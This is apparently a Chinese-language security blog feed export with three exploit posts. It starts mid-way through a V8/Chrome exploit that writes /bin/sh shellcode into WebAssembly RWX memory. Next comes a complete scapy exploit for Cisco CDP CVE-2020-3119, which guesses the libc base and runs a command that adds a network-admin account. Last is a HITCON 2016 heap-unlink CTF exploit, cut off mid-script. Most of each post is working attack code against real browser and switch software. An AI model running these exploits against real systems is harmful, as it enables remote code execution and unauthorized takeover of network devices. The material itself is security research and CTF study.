class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    inline();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">if</span>(oob_array.length &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        myprint(<span class="string">&quot;[+] oob successed!&quot;</span>);</span><br><span class="line">        myprint(<span class="string">&quot;[+] oob_array length is : &quot;</span> + oob_array.length);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;oob Failed&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_search; ++i)&#123;</span><br><span class="line">        <span class="keyword">var</span> value = float2address(oob_array[i]);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">            leak_obj_offset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_search; ++i)&#123;</span><br><span class="line">        <span class="keyword">var</span> value = float2address(oob_array[i]);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="number">0x4321</span>)&#123;</span><br><span class="line">            rw_arraybuffer_offset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(leak_obj_offset == <span class="number">0</span> || rw_arraybuffer_offset==<span class="number">0</span>) <span class="keyword">throw</span> <span class="string">&quot;get offset failed&quot;</span></span><br><span class="line"></span><br><span class="line">    myprint(<span class="string">&quot;[+] leak_obj_offset : &quot;</span> + leak_obj_offset);</span><br><span class="line">    myprint(<span class="string">&quot;[+] rw_arraybuffer_offset : &quot;</span> + rw_arraybuffer_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> wasm_func_addr = addrOf(func) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] wasm func addr : &quot;</span> + hex(wasm_func_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> shared_info = read64(wasm_func_addr + <span class="number">0x18</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] wasm shared info : &quot;</span> + hex(shared_info));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> data_address = read64(shared_info + <span class="number">0x8</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] data_address : &quot;</span> + hex(data_address));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> instance_address = read64(data_address + <span class="number">0x10</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] instance_address : &quot;</span> + hex(instance_address));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> rwx_address = read64(instance_address + <span class="number">0x108</span>);</span><br><span class="line">    myprint(<span class="string">&quot;[+] rwx_address : &quot;</span> + hex(rwx_address));</span><br><span class="line">    <span class="comment">// %DebugPrint(func);</span></span><br><span class="line">    <span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">    write32(rwx_address, <span class="number">0x99583b6a</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x4</span>, <span class="number">0x2fbb4852</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x8</span>, <span class="number">0x6e69622f</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0xc</span>, <span class="number">0x5368732f</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x10</span>, <span class="number">0x57525f54</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x14</span>, <span class="number">0x050f5e54</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// %SystemBreak();</span></span><br><span class="line">    <span class="comment">// let&#x27;s go to the shellcode </span></span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="6-reference"><a href="#6-reference" class="headerlink" title="6. reference"></a>6. reference</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=941743">crbug-941743</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>exploit</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>Cisco CDP cve-2020-3119</title>
    <url>/2020/04/23/Cisco-CDP-cve-2020-3119/</url>
    <content><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>使用GNS3可以复现漏洞；使用<a href="https://www.eve-ng.net/">EVE</a>也可以，一个定制化的Linux，提供一个仿真环境，我当时两个方法都测试了,GNS3有点小坑，最后在EVE上测试通过的。</p>
<a id="more"></a>


<p>配置的流程其实都一样，进入console启动交换机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dir</span><br><span class="line">boot nxos.9.3.2.bin</span><br></pre></td></tr></table></figure>


<p>设置密码 <code>Root1234</code></p>
<p>配置nexus交换机。<br>参考这里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">switch<span class="comment"># conf t</span></span><br><span class="line">Enter configuration commands, one per line. End with CNTL/Z.</span><br><span class="line">switch(config)<span class="comment"># interface mgmt0</span></span><br><span class="line">switch(config-if)<span class="comment"># ip address 10.0.2.15/24  &lt;--- <span class="doctag">NOTE:</span> can use &quot;ip address dhcp&quot; here instead</span></span><br><span class="line">switch(config-if)<span class="keyword">in</span><span class="comment"># no shut</span></span><br><span class="line">switch(config-if)<span class="comment"># end</span></span><br><span class="line">switch<span class="comment"># conf t</span></span><br><span class="line">Enter configuration commands, one per line. End with CNTL/Z.</span><br><span class="line">switch(config)<span class="comment"># username vagrant password vagrant role network-admin</span></span><br><span class="line">switch(config)<span class="comment"># username vagrant shell bash</span></span><br><span class="line">switch(config)<span class="comment"># boot nxos bootflash:nxos.7.0.3.I2.2d.bin  &lt;--- Note: use correct image name from &quot;dir&quot; command output</span></span><br><span class="line">switch(config)<span class="comment"># copy r s</span></span><br><span class="line">[<span class="comment">########################################] 100%</span></span><br><span class="line">Copy complete.</span><br><span class="line">switch(config)<span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>直接反汇编bin有坑，需要gdbdump了看dump。</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Cisco-CDP-cve-2020-3119/15878896392963.jpg" alt="-w766"></p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Cisco-CDP-cve-2020-3119/15878896392963.jpg" alt="-w766"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(&amp;a1-&gt;levels + counter) = *(&amp;ptr + counter);<span class="comment">// write what where</span></span><br></pre></td></tr></table></figure>

<p>这里可以任意地址写。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RPATH:    b<span class="string">&#x27;/isan/lib/convert:/isan/lib:/isanboot/lib&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ret_addr + JUNK + arg1</span><br></pre></td></tr></table></figure>

<p>猜两个地址，stack base和 libc base， 以及heap address？</p>
<p>存在栈上的堆地址怎么用呢？ret过去？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = [</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0</span>),</span><br><span class="line"><span class="string">&#x27;A&#x27;</span> * <span class="number">64</span>,</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>), <span class="comment"># saved ebp</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + pop_ret_offset), <span class="comment"># ret addr</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + libc_bss_offset), <span class="comment"># a1</span></span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + pop_ret_offset),</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>),</span><br><span class="line">...</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, libc_base + system_offset),</span><br><span class="line">struct.pack(<span class="string">&#x27;!h&#x27;</span>, <span class="number">0xdeadbeef</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>只需要猜system所在libc的基地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">junk</span><br><span class="line">saved ebp</span><br><span class="line">ret addr; &#x2F;&#x2F; pop ret即可</span><br><span class="line">a1</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">...</span><br><span class="line">pop ret</span><br><span class="line">junk</span><br><span class="line">system_addr</span><br><span class="line">xxxx</span><br><span class="line">cmd_str_addr</span><br></pre></td></tr></table></figure>

<p>a1只要是一个符合条件的指向data段的指针即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.contrib <span class="keyword">import</span> cdp</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> Ether, LLC, SNAP, sendp</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset_to_cmd = <span class="number">40</span> <span class="comment"># TODO</span></span><br><span class="line">libc_bss_offset = <span class="number">0x001B4EE0</span> + <span class="number">0x200</span> <span class="comment"># use for a1</span></span><br><span class="line">system_offset = <span class="number">0x0003C790</span>  <span class="comment"># system func</span></span><br><span class="line"></span><br><span class="line">pr_offset = <span class="number">0x00021b07</span> <span class="comment"># pop eax; ret</span></span><br><span class="line"><span class="comment"># pppr_offset_offset = 0x000df5d2 # pop ebp ; pop edi ; pop ebx ; ret</span></span><br><span class="line">ppr_offset_offset = <span class="number">0x000f5e5a</span>  <span class="comment"># pop ebp ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;/isan/bin/vsh -c &quot;configure terminal ; username test password qweASD123 role network-admin&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">libc_base</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x0</span>) + <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) <span class="comment"># saved ebp + ret addr</span></span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + libc_bss_offset) <span class="comment"># a1</span></span><br><span class="line">    <span class="keyword">if</span> offset_to_cmd % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        payload += (struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)) * offset_to_cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + ppr_offset_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>) * <span class="number">2</span></span><br><span class="line">        payload += (struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + pr_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)) * (offset_to_cmd - <span class="number">3</span>)</span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, libc_base + system_offset) + struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="number">0x00001337</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="comment"># link layer</span></span><br><span class="line">    l2_packet = Ether(dst=<span class="string">&quot;01:00:0c:cc:cc:cc&quot;</span>)</span><br><span class="line">    <span class="comment"># Logical-Link Control</span></span><br><span class="line">    l2_packet /= LLC(dsap=<span class="number">0xaa</span>, ssap=<span class="number">0xaa</span>, ctrl=<span class="number">0x03</span>) / SNAP()</span><br><span class="line">    <span class="comment"># Cisco Discovery Protocol</span></span><br><span class="line">    cdp_v2 = cdp.CDPv2_HDR(vers=<span class="number">2</span>, ttl=<span class="number">180</span>)</span><br><span class="line">    deviceid = cdp.CDPMsgDeviceID(val=cmd)</span><br><span class="line">    portid = cdp.CDPMsgPortID(iface=<span class="string">b&quot;ens38&quot;</span>)</span><br><span class="line">    address = cdp.CDPMsgAddr(naddr=<span class="number">1</span>, addr=cdp.CDPAddrRecordIPv4(addr=<span class="string">&quot;192.168.204.77&quot;</span>))</span><br><span class="line">    cap = cdp.CDPMsgCapabilities(cap=<span class="number">1</span>)</span><br><span class="line">    power_req = cdp.CDPMsgUnknown19(val=payload)</span><br><span class="line">    power_level = cdp.CDPMsgPower(power=<span class="number">16</span>)</span><br><span class="line">    cdp_packet = cdp_v2/deviceid/portid/address/cap/power_req/power_level</span><br><span class="line">    packet = l2_packet / cdp_packet</span><br><span class="line">    sendp(packet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">assert</span> offset_to_cmd !=<span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> libc_base <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf5000000</span>, <span class="number">0xf5fff000</span>, <span class="number">0x1000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(<span class="string">&#x27;[*] Exploiting...guess libc on &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">            payload = gen(libc_base)</span><br><span class="line">            exploit(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    payload = gen(<span class="number">0xf5dd9000</span>)</span><br><span class="line">    exploit(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># main()</span></span><br><span class="line">    test()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://paper.seebug.org/1154/">CVE-2020-3119 Cisco CDP 协议栈溢出漏洞分析s</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>CDP</tag>
        <tag>Cisco</tag>
      </tags>
  </entry>
  <entry>
    <title>HITCON-2016-Quals-SecretHolder</title>
    <url>/2016/10/11/HITCON-2016-Quals-SecretHolder/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>前几天hitcon2016开啦，就想着去看看题，学习下，pwn100的这个<code>SecretHolder</code>是个<code>double free</code>的洞，但是当时并不知道怎么去搞，今天刚从<a href="http://0byjwzsf.me/">Icemakr</a>师傅那里学到了思路，所以就记录一下。</p>
<a id="more"></a>
<h4 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01: 程序分析"></a>0x01: 程序分析</h4><p>程序很容易分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+10h] [bp-10h]@2</span></span><br><span class="line">  __int64 v5; <span class="comment">// [sp+18h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  sub_400C80(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hey! Do you have any secret?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I can help you to hold your secrets, and no one will be able to see it :)"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. Keep secret"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. Wipe secret"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3. Renew secret"</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">4u</span>LL);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">4u</span>LL);</span><br><span class="line">    choice = atoi(&amp;s);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        wipe_secret();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        renew_secret();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        keep_secret();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新建块的时候</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( size_of_secret == <span class="number">2</span> )                    <span class="comment">// big</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !flag_big )</span><br><span class="line">  &#123;</span><br><span class="line">    big_buffer = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">4000u</span>LL);</span><br><span class="line">    flag_big = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Tell me your secret: "</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, big_buffer, <span class="number">4000u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( size_of_secret == <span class="number">3</span> )               <span class="comment">// huge</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !flag_huge )</span><br><span class="line">  &#123;</span><br><span class="line">    huge_buffer = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">400000u</span>LL);</span><br><span class="line">    flag_huge = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Tell me your secret: "</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, huge_buffer, <span class="number">400000u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( size_of_secret == <span class="number">1</span> &amp;&amp; !flag_small )<span class="comment">// samll</span></span><br><span class="line">&#123;</span><br><span class="line">  small_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">40u</span>LL);</span><br><span class="line">  flag_small = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Tell me your secret: "</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, small_buf, <span class="number">40u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>释放块的时候</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( wipe_choice )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">     <span class="built_in">free</span>(big_buffer);</span><br><span class="line">     flag_big = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">     <span class="built_in">free</span>(huge_buffer);</span><br><span class="line">     flag_huge = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">     <span class="built_in">free</span>(small_buf);</span><br><span class="line">     flag_small = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>在.bss段上有标志位，标志着当前这种块有没有被使用。</p>
<p>问题是，每种块只能建一次，而且 <code>huge buffer</code>是<code>mmap</code>出来的，我以为就没啥用了…今天看了师傅的博客才知道</p>
<pre><code>实际上，先创建huge note，再free huge note之后，再次创建huge note时，malloc就会用sbrk来分配内存了，之后就是常规的double free了。</code></pre>
<p>思路get，就可以接着搞了。</p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02:"></a>0x02:</h4><p>分配huge，释放huge，然后分配small，big，然后释放small，big，再分配huge时，分配的huge内存分配就如图所示了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/hitcon_pwn100/debug-heap-view.png"><br>可以根据这个伪造堆块，然后去<code>free(big_chunk)</code>，之后就可以得到<code>.bss</code>上一个地址啦，接着就可以去做leak，修改got的事情了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">   <span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">   <span class="comment">#target = './SecretHolder'</span></span><br><span class="line">   target = (<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)</span><br><span class="line">   io = zio(target, timeout=<span class="number">10000</span>, print_read=COLORED(RAW, <span class="string">'red'</span>), print_write=COLORED(RAW, <span class="string">'green'</span>))</span><br><span class="line"></span><br><span class="line">   big_note_addr       = <span class="number">0x6020a0</span></span><br><span class="line">   huge_note_addr      = <span class="number">0x6020a8</span></span><br><span class="line">   small_note_addr     = <span class="number">0x6020b0</span></span><br><span class="line">   got_atoi_addr       = <span class="number">0x602070</span></span><br><span class="line">   got_free_addr       = <span class="number">0x602018</span></span><br><span class="line">   plt_puts_addr       = <span class="number">0x4006c0</span></span><br><span class="line">   <span class="comment">#ubuntu 16.04</span></span><br><span class="line">   offset_system_atoi = <span class="number">0xe510</span></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">Keep_secret</span><span class="params">(size,content)</span>:</span></span><br><span class="line">       io.read_until(<span class="string">'3. Renew secret'</span>)</span><br><span class="line">       io.writeline(<span class="string">'1'</span>)</span><br><span class="line">       io.read_until(<span class="string">'3. Huge secret'</span>)</span><br><span class="line">       io.writeline(str(size))</span><br><span class="line">       io.read_until(<span class="string">'Tell me your secret:'</span>)</span><br><span class="line">       io.writeline(str(content))</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">Wipe_secret</span><span class="params">(size)</span>:</span></span><br><span class="line">       io.read_until(<span class="string">'3. Renew secret'</span>)</span><br><span class="line">       io.writeline(<span class="string">'2'</span>)</span><br><span class="line">       io.read_until(<span class="string">'3. Huge secret'</span>)</span><br><span class="line">       io.writeline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Renew_secret</span><span class="params">(size,new_content)</span>:</span></span><br><span class="line">       io.read_until(<span class="string">'3. Renew secret'</span>)</span><br><span class="line">       io.writeline(<span class="string">'3'</span>)</span><br><span class="line">       io.read_until(<span class="string">'3. Huge secret'</span>)</span><br><span class="line">       io.writeline(str(size))</span><br><span class="line">       io.read_until(<span class="string">'Tell me your secret:'</span>)</span><br><span class="line">       io.writeline(str(new_content))</span><br><span class="line"></span><br><span class="line">   <span class="comment">#small = 1</span></span><br><span class="line">   <span class="comment">#big   = 2</span></span><br><span class="line">   <span class="comment">#huge  = 3</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">#malloc huge and free it.</span></span><br><span class="line">   Keep_secret(<span class="number">3</span>,<span class="string">"C"</span>*<span class="number">0x100</span>)</span><br><span class="line">   Wipe_secret(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#malloc small chunk and big chunk.</span></span><br><span class="line">   Keep_secret(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x20</span>)</span><br><span class="line">   Keep_secret(<span class="number">2</span>,<span class="string">"B"</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#free small and big chunk.</span></span><br><span class="line">   Wipe_secret(<span class="number">1</span>)</span><br><span class="line">   Wipe_secret(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">   payload  = l64(<span class="number">0x0</span>) + l64(<span class="number">0x30</span>) + l64(huge_note_addr - <span class="number">0x8</span> * <span class="number">3</span>) + l64(huge_note_addr - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">   <span class="comment"># chunk 1 (free'd)</span></span><br><span class="line">   payload += l64(<span class="number">0x20</span>) + l64(<span class="number">0xa0</span>)</span><br><span class="line">   payload += <span class="string">'A'</span> * <span class="number">0x90</span></span><br><span class="line">   <span class="comment"># chunk 2</span></span><br><span class="line">   payload += l64(<span class="number">0x0</span>) + l64(<span class="number">0xa1</span>)</span><br><span class="line">   payload += <span class="string">'A'</span> * <span class="number">0x90</span></span><br><span class="line">   <span class="comment"># chunk 3</span></span><br><span class="line">   payload += l64(<span class="number">0x0</span>) + l64(<span class="number">0xa1</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#raw_input('0x000000000040086D')</span></span><br><span class="line">   Keep_secret(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#free big chunk --&gt; unlink bug here.</span></span><br><span class="line">   <span class="comment">#raw_input('0x0000000000400A27')</span></span><br><span class="line">   Wipe_secret(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#overwrite ptrs on .bss</span></span><br><span class="line">   payload_leak =  <span 